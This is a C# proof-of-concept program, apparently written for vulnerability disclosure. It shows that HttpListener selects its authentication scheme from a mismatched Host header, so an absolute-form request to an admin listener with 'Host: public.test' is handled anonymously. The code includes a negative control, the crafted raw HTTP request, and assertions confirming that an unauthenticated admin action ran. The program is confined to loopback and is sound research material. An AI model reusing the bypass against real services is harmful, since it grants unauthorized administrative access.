using System.Net;
using System.Net.Sockets;
using System.Text;

static int ReservePort()
{
    using var t = new TcpListener(IPAddress.Loopback, 0);
    t.Start();
    return ((IPEndPoint)t.LocalEndpoint).Port;
}

static Socket ConnectLoopback(int port)
{
    var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    socket.Connect(IPAddress.Loopback, port);
    return socket;
}

static async Task<string> ReadWireAsync(Socket client)
{
    byte[] buffer = new byte[8192];
    using var ms = new MemoryStream();
    using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
    try
    {
        while (true)
        {
            int n = await client.ReceiveAsync(buffer.AsMemory(), SocketFlags.None, cts.Token);
            if (n == 0) break;
            await ms.WriteAsync(buffer.AsMemory(0, n), cts.Token);
        }
    }
    catch (OperationCanceledException) {}
    return Encoding.ASCII.GetString(ms.ToArray());
}

static AuthenticationSchemes SelectScheme(HttpListenerRequest request) =>
    string.Equals(request.UserHostName, "public.test", StringComparison.OrdinalIgnoreCase)
        ? AuthenticationSchemes.Anonymous
        : AuthenticationSchemes.Basic;

static async Task<(HttpListener Public, HttpListener Admin, int Port)> StartPair()
{
    int port = ReservePort();
    var pub = new HttpListener();
    var adm = new HttpListener();

    pub.Prefixes.Add($"http://public.test:{port}/");
    adm.Prefixes.Add($"http://admin.test:{port}/");

    pub.AuthenticationSchemes = AuthenticationSchemes.None;
    adm.AuthenticationSchemes = AuthenticationSchemes.None;
    pub.Realm = "public-research";
    adm.Realm = "admin-research";
    pub.AuthenticationSchemeSelectorDelegate = SelectScheme;
    adm.AuthenticationSchemeSelectorDelegate = SelectScheme;

    pub.Start();
    adm.Start();
    await Task.Yield();
    return (pub, adm, port);
}

string marker = Path.Combine(Path.GetTempPath(), $"httplistener-admin-action-{Guid.NewGuid():N}.txt");
try
{
    Console.WriteLine($"OS={Environment.OSVersion}");
    Console.WriteLine($"FRAMEWORK={System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");
    Console.WriteLine($"STATE_MARKER={marker}");

    // Negative control: normal admin request is challenged before an admin context exists.
    {
        var pair = await StartPair();
        using var pub = pair.Public;
        using var adm = pair.Admin;
        Task<HttpListenerContext> publicTask = pub.GetContextAsync();
        Task<HttpListenerContext> adminTask = adm.GetContextAsync();
        using var client = ConnectLoopback(pair.Port);

        string raw =
            "POST /admin-action HTTP/1.1\r\n" +
            "Host: admin.test\r\n" +
            "Content-Length: 0\r\n" +
            "Connection: close\r\n\r\n";

        await client.SendAsync(Encoding.ASCII.GetBytes(raw), SocketFlags.None);
        Task<string> wireTask = ReadWireAsync(client);
        Task first = await Task.WhenAny(wireTask, adminTask, publicTask).WaitAsync(TimeSpan.FromSeconds(5));
        if (!ReferenceEquals(first, wireTask)) throw new Exception("Admin control unexpectedly delivered a context");

        string wire = await wireTask;
        if (!wire.Contains("401", StringComparison.Ordinal) ||
            !wire.Contains("WWW-Authenticate: Basic", StringComparison.OrdinalIgnoreCase))
            throw new Exception("Admin control did not receive Basic 401");
        if (File.Exists(marker)) throw new Exception("Admin state marker existed after blocked control");

        Console.WriteLine(
            $"STATE_CHANGE_CONTROL=PASS STATUS_401=True BASIC_CHALLENGE=True " +
            $"PUBLIC_CONTEXT={publicTask.IsCompletedSuccessfully} ADMIN_CONTEXT={adminTask.IsCompletedSuccessfully} MARKER_EXISTS={File.Exists(marker)}");
    }

    // Attack: framework routes the absolute-form request to the exact admin listener,
    // but that admin listener's selector sees Host=public.test and selects Anonymous.
    {
        var pair = await StartPair();
        using var pub = pair.Public;
        using var adm = pair.Admin;

        int publicSelectorCalls = 0;
        int adminSelectorCalls = 0;
        AuthenticationSchemes selected = AuthenticationSchemes.None;
        string selectorUserHost = "<not-called>";
        string selectorUrlHost = "<not-called>";

        pub.AuthenticationSchemeSelectorDelegate = request =>
        {
            Interlocked.Increment(ref publicSelectorCalls);
            return SelectScheme(request);
        };
        adm.AuthenticationSchemeSelectorDelegate = request =>
        {
            Interlocked.Increment(ref adminSelectorCalls);
            selectorUserHost = request.UserHostName ?? "<null>";
            selectorUrlHost = request.Url?.Host ?? "<null>";
            selected = SelectScheme(request);
            Console.WriteLine(
                $"STATE_CHANGE_ADMIN_SELECTOR USERHOST={selectorUserHost} URLHOST={selectorUrlHost} SELECTED={selected}");
            return selected;
        };

        Task<HttpListenerContext> publicTask = pub.GetContextAsync();
        Task<HttpListenerContext> adminTask = adm.GetContextAsync();
        using var client = ConnectLoopback(pair.Port);

        string raw =
            $"POST http://admin.test:{pair.Port}/admin-action HTTP/1.1\r\n" +
            "Host: public.test\r\n" +
            "Content-Length: 0\r\n" +
            "Connection: close\r\n\r\n";

        await client.SendAsync(Encoding.ASCII.GetBytes(raw), SocketFlags.None);
        HttpListenerContext context = await adminTask.WaitAsync(TimeSpan.FromSeconds(5));

        if (publicTask.IsCompletedSuccessfully) throw new Exception("Attack was routed to public listener");
        if (publicSelectorCalls != 0 || adminSelectorCalls != 1)
            throw new Exception($"Unexpected selector calls public={publicSelectorCalls} admin={adminSelectorCalls}");
        if (selected != AuthenticationSchemes.Anonymous)
            throw new Exception($"Expected Anonymous, got {selected}");
        if (context.User is not null) throw new Exception("Expected anonymous admin context");
        if (!string.Equals(context.Request.Url?.Host, "admin.test", StringComparison.OrdinalIgnoreCase))
            throw new Exception("Expected admin route");
        if (!string.Equals(context.Request.UserHostName, "public.test", StringComparison.OrdinalIgnoreCase))
            throw new Exception("Expected stale public Host in selector");

        // Concrete protected integrity action, reachable only after the admin context is delivered.
        string sentinel = "ADMIN_STATE_CHANGED_BY_UNAUTHENTICATED_CONTEXT_6f42";
        await File.WriteAllTextAsync(marker, sentinel);
        if (!File.Exists(marker) || await File.ReadAllTextAsync(marker) != sentinel)
            throw new Exception("Protected state mutation did not persist");

        byte[] body = Encoding.ASCII.GetBytes("ADMIN_ACTION_EXECUTED=true\n");
        context.Response.StatusCode = 200;
        context.Response.ContentLength64 = body.Length;
        await context.Response.OutputStream.WriteAsync(body);
        context.Response.Close();

        string wire = await ReadWireAsync(client);
        if (!wire.Contains("200", StringComparison.Ordinal) ||
            wire.Contains("WWW-Authenticate: Basic", StringComparison.OrdinalIgnoreCase))
            throw new Exception("Attack did not produce anonymous 200");

        Console.WriteLine(
            $"STATE_CHANGE_ATTACK=CONFIRMED ROUTED_LISTENER=ADMIN USERHOST={selectorUserHost} URLHOST={selectorUrlHost} " +
            $"SELECTED={selected} USER={(context.User is null ? "ANONYMOUS" : "AUTHENTICATED")} STATUS_200=True " +
            $"BASIC_CHALLENGE=False PUBLIC_SELECTOR_CALLS={publicSelectorCalls} ADMIN_SELECTOR_CALLS={adminSelectorCalls} " +
            $"MARKER_EXISTS={File.Exists(marker)} MARKER_CONTENT={await File.ReadAllTextAsync(marker)}");
    }

    Console.WriteLine("HTTP_LISTENER_PROTECTED_STATE_CHANGE_PROOF=PASS");
}
finally
{
    try { File.Delete(marker); } catch {}
}
